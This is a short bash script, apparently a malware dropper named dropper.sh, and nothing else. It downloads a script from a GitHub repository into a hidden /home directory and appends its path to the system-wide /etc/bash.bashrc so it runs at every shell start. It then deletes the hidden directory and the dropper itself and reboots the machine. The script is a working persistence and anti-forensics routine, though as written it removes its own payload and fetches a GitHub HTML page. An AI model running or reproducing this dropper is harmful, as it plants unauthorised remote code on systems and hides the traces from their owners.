#!/bin/bash

wget -O /home/.hidden/alphabet_cereal.sh https://github.com/P0nt14c/alphabet_cereal/blob/master/methods.sh

echo /home/.hidden/alphabet_cereal.sh >> /etc/bash.bashrc

rm -rf /home/.hidden/
rm -f ../dropper.sh

reboot
